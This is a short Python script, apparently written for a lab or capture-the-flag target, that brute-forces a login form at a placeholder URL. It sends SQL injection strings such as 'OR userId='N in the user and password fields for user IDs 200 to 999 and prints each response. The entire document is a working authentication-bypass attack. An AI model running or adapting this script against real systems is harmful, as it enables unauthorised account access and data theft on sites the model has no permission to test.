import requests

for i in range(200,1000):
    url = '#YOUR_URL#'
    myobj = {'user': '\'OR userId=\'{}'.format(i), 'pass': '\'OR userId=\'{}'.format(i), 'submit':''}

    x = requests.post(url, data = myobj)

    print(x.request.body)

    print(x.text)